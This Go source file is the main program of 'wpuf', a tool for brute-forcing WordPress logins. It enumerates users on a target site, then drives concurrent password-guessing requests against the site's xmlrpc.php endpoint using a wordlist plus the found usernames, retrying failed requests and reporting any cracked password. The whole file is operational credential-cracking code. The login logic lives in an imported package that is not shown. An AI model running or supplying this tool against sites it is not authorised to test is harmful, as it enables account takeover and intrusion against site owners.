package main

import (
	"fmt"
	"github.com/3dprogramin/wpuf/pkg/wpuf"
	"strings"
	"sync/atomic"
	"time"
)

// start the worker thread
func worker(settings *wpuf.Settings, jobs chan string, result chan<- *wpuf.LoginAttempt, counterProcessed *uint64, counterError *uint64) {
	for password := range jobs {
		p := wpuf.LoginAttempt{Password: password, Error: false}
		p.Error, p.Success = wpuf.CheckPasswordRequest(settings, password, counterError)
		result <- &p
		if p.Error {
			// if (accepted) error, such as timeout or EOR
			// add password to jobs to retry
			jobs <- password
		}
		atomic.AddUint64(counterProcessed, 1)
	}
}

// findUsers from Wordpress URL
func findUsers(settings *wpuf.Settings) (string, []string) {
	if settings.Enumerate {
		fmt.Println("[-] Enumerate mode, trying to enumerate users...")
	} else {
		fmt.Println("[-] Username not defined, trying to enumerate users...")
	}

	users := wpuf.FindUsers(settings)

	// return if enumerate only
	if settings.Enumerate {
		return "", users
	}

	if len(users) == 0 {
		if settings.Enumerate {
			fmt.Println("[!] No users found")
		} else {
			fmt.Println("[!] No users found, try setting it manually")
		}
		return "", users
	}
	return users[0], users
}

// waitForCracking to complete or for a password to be found
func waitForCracking(settings *wpuf.Settings, passwordsLength int, loginAttempts chan *wpuf.LoginAttempt, counterProcessed *uint64, counterError *uint64) bool {
	start := time.Now()

	lengthPasswordsFloat64 := float64(passwordsLength)
	// get all loginAttempts from all attempts through the communication channel
	for k := 0; k < passwordsLength; k++ {
		// get a loginAttempt from the channel
		loginAttempt := <-loginAttempts

		// if it's  success, print the password and return
		if loginAttempt.Success {
			fmt.Printf(wpuf.InfoColor, fmt.Sprintf("\n[+] PASSWORD FOUND - %s\n", loginAttempt.Password))
			return true
		}

		// wpuf.CheckError for processed items
		processed := atomic.LoadUint64(counterProcessed)
		errors := atomic.LoadUint64(counterError)

		// if too many errors, stop
		if settings.MaxErrors != -1 && int(errors) >= settings.MaxErrors {
			fmt.Println(fmt.Errorf("too many consecutive errors - %d", errors))
			return false
		}
		// percentage := int64(processed) * int64(100) / int64(passwordsLength)
		if processed%100 == 0 && wpuf.LastUpdate != processed {
			wpuf.PrintProgress(start, lengthPasswordsFloat64, processed, int(errors), loginAttempt)
		}
	}
	return false
}

func main() {
	fmt.Printf("[+] wpuf - v%s\n", wpuf.Version)

	// --------------------------------------------------------
	// read the command-line arguments from user
	// --------------------------------------------------------
	settings := wpuf.ParseUserInput()
	if settings.Error {
		return
	}

	// print the disclaimer
	wpuf.PrintDisclaimer()

	fmt.Printf(wpuf.DebugColor, fmt.Sprintf("[-] Target URL: %s\n", settings.Url))

	// ---------------------------------------------------
	// if username was not given, try to find the foundUsers
	// ---------------------------------------------------
	var foundUsers []string
	if len(settings.Username) == 0 || settings.Enumerate {
		settings.Username, foundUsers = findUsers(settings)
		if settings.Username == "" {
			return
		}
	}
	fmt.Printf(wpuf.DebugColor, fmt.Sprintf("[-] Username: %s\n\n", settings.Username))

	// --------------------------------------------------------
	// read the passwords
	// --------------------------------------------------------
	fmt.Println("[-] Reading passwords...")
	passwords := wpuf.ReadPasswords(settings.Wordlist)
	fmt.Printf("[-] Read %d passwords\n", len(passwords))
	// append the username to passwords list
	for _, user := range foundUsers {
		passwords = append(passwords, user)
	}
	passwordsLength := len(passwords)

	// add /xmlrpc.php to url
	if strings.HasSuffix(settings.Url, "/") {
		settings.Url += "xmlrpc.php"
	} else {
		settings.Url += "/xmlrpc.php"
	}

	// --------------------------------------------------------
	// initialize routines
	// --------------------------------------------------------
	var counterProcessed, counterError uint64
	jobs := make(chan string, passwordsLength)
	loginAttempts := make(chan *wpuf.LoginAttempt, passwordsLength)
	for t := 1; t <= settings.Threads; t++ {
		go worker(settings, jobs, loginAttempts, &counterProcessed, &counterError)
	}

	fmt.Println("[-] Initializing...")

	// --------------------------------------------------------
	// set jobs that will be executed by routines
	// --------------------------------------------------------
	for i := 0; i < len(passwords); i++ {
		password := passwords[i]
		jobs <- password
	}
	// we don't close it here anymore because we add to the jobs
	// whenever a request throws an (acceptable) error
	// ---------------------------------------------------------
	// when all jobs are ready, close their channel
	// close(jobs)

	// ---------------------------------------------------
	// cracking has started, wait for it to finish
	// or for password to be found
	// ---------------------------------------------------
	fmt.Printf("[-] Ready, starting to crack\n\n")
	found := waitForCracking(settings, passwordsLength, loginAttempts, &counterProcessed, &counterError)
	if found {
		return
	}

	// --------------------------------------------------------
	// password was not found, close the loginAttempts channel
	// --------------------------------------------------------
	close(loginAttempts)
	close(jobs)
	fmt.Println("[-] Password was not found :(")
}
